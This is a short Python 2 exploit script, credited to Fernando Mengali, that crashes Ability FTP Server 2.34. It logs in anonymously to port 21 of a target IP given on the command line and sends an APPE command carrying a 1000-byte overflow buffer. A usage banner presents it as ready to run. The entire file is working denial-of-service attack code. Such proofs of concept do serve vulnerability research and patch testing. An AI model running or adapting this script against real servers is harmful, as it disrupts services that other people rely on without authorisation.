#!/usr/bin/python
#
# e-mail: fernando.mengalli@gmail.com
#
# Date: 06/10/2021 - 10 jun
#
# Version Vulnerable: Ability FTP Server 2.34
#
# OS Tested: Windows XP PACK 3 Brazilian

import socket
import sys

if len(sys.argv) != 2:
    print "########################################################"
    print "#                                                                                                            #"
    print "#  Ability FTP Server 2.34 -- Command 'APPE' Denied of Service        #"
    print "#                                                                                                            #"
    print "#              Author: Fernando Mengali                                                    #"
    print "#                                                                                                            #"
    print "#              Usage: exploit.py <IP>                                                         #" 
    print "#                                                                                                            #"
    print "########################################################"
    sys.exit(1)
  
target = sys.argv[1]

payload = "A"*1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect = s.connect((target, 21))
    print "[+] Conectado com sucesso"
except:
    print "[-] Falha ao conectar para o servidor..."
    sys.exit(0)
s.recv(1024)
print "[+] Autenticando..." 	
s.send('User anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
print "[+] Enviando pacote crafted..."
s.send('APPE '+payload+'\r\n')
s.close()
